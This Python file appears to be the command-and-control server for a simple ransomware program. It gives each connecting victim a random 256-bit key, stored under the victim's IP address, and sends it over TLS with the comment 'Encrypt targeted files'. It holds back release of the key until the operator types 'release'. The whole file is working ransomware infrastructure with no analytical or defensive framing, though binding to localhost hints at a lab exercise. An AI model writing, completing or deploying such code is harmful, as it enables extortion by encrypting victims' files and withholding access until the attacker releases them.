import os
import socket
import ssl
import ssl

HOST = '127.0.0.1'
PORT = 8080


def generate_new_key(client_ip):
    random_key = os.urandom(32) # 32 bytes -> 256 bits
    with open(os.path.join('keys', f'{client_ip}.txt'), 'wb') as key_file:
        key_file.write(random_key)
    return random_key

def read_existing_key(client_ip):
    with open(os.path.join('keys', f'{client_ip}.txt'), 'rb') as key_file:
        key = key_file.read()
        return key



def create_server() -> socket.socket:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.bind((HOST, PORT))
    sock.listen(1)
    print('server is listening...')
    return sock

def create_ssl_context() -> ssl.SSLContext:
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    context.load_cert_chain(certfile='server.crt', keyfile='server.key')
    return context


if __name__ == '__main__':
    server = create_server()
    context = create_ssl_context()

    # Accept a client
    connection, address = server.accept()
    ssl_connection = context.wrap_socket(connection, server_side=True)
    ip, port = ssl_connection.getpeername()

    # Encrypt targeted files
    random_key = generate_new_key(ip)
    ssl_connection.sendall(random_key)

    # Free encrypted files
    while input("Write 'release' to free the target from the encryption: ") != 'release':
        pass

    target_key = read_existing_key(ip)
    ssl_connection.sendall(target_key)

    # Close all sockets
    ssl_connection.close()
    server.close()